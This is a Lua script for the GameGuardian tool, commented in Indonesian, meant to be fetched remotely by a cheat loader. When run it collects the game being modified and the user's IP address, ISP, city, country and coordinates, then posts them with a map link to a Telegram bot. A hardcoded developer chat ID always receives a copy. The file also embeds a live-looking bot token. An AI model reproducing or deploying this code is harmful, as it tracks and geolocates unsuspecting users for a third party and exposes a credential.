-- [[ VELLSC REMOTE CORE LOGIC ]]
-- Developer: JULES-CORE
-- Deskripsi: Script inti yang di-upload ke server cloud (Vercel/Gist).

-- 1. IDENTITAS DEVELOPER (ADMIN)
local ADMIN_ID = "6149504951" -- Always receives a copy

-- 2. KONFIGURASI BOT
local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"

-- 3. AMBIL PUBLIC ID DARI LOADER (Variabel Global)
-- Script ini mencari variabel _G.PUBLIC_ID atau _G.id_chat yang di-set oleh loader.
local PUBLIC_ID = _G.PUBLIC_ID or _G.id_chat

-- VALIDASI: Berikan instruksi jika user lupa mengedit loader
if not PUBLIC_ID or PUBLIC_ID == "" then
    gg.alert("⚠️ [ERROR]: ID Chat Belum Diatur!\n\n" ..
             "Silakan buka script LOADER Anda dan pastikan sudah mengisi:\n" ..
             "local id_chat = \"ID_CHAT_ANDA\"\n" ..
             "_G.PUBLIC_ID = id_chat")
    return
end

-- [[ SYSTEM FUNCTIONS ]]
local function get_session_info()
    local gameName, package = "Unknown Game", "Unknown Package"
    local status, info = pcall(gg.getTargetInfo)
    if status and info then
        gameName = info.label or gameName
        package = info.packageName or package
    end
    return { game = gameName, package = package }
end

local function get_location()
    gg.toast("🛰️ Sinkronisasi koordinat global...")
    local res = gg.makeRequest("http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query")
    if not res or res.code ~= 200 then return nil end
    local lines = {}
    for line in res.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
    if lines[1] ~= "success" then return nil end
    return {
        country = lines[2], region = lines[3], city = lines[4],
        lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8]
    }
end

local function send_report()
    local date, time = os.date("%Y-%m-%d"), os.date("%H:%M:%S")
    local session = get_session_info()
    local loc = get_location()
    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")

    local line = "━━━━━━━━━━━━━━━━━━━━"
    local message = "🚀 <b>[ VELLSC SYSTEM REPORT ]</b>\n" ..
                    line .. "\n" ..
                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
                    line .. "\n" ..
                    "<b>🎮 GAME    :</b> <code>" .. session.game .. "</code>\n" ..
                    "<b>📦 PACKAGE :</b> <code>" .. session.package .. "</code>\n" ..
                    line .. "\n" ..
                    "<b>🌐 IP ADDR :</b> <code>" .. (loc and loc.ip or "Unknown") .. "</code>\n" ..
                    "<b>🏢 ISP     :</b> <code>" .. (loc and loc.isp or "Unknown") .. "</code>\n" ..
                    "<b>🏙️ KOTA    :</b> <code>" .. (loc and loc.city or "Unknown") .. "</code>\n" ..
                    "<b>🇮🇩 NEGARA  :</b> <code>" .. (loc and loc.country or "Unknown") .. "</code>\n" ..
                    line .. "\n" ..
                    "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }
    local escaped_msg = message:gsub('"', '\\"'):gsub('\n', '\\n')

    -- Target pengiriman: Admin (Wajib) & Public (User)
    local targets = {ADMIN_ID}
    if PUBLIC_ID ~= ADMIN_ID then
        table.insert(targets, PUBLIC_ID)
    end

    gg.toast("📡 Melaporkan status sistem...")

    local successCount = 0
    for _, id in ipairs(targets) do
        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_msg .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
        local res = gg.makeRequest(tgUrl, headers, body)
        if res and res.code == 200 then
            successCount = successCount + 1
        end
    end

    if successCount > 0 then
        gg.alert("✅ Log Berhasil Terkirim ke:\n1. Developer\n2. ID Chat: " .. PUBLIC_ID)
    else
        gg.alert("❌ Gagal mengirim log ke Telegram.\nPeriksa koneksi internet atau Token Bot.")
    end
end

send_report()
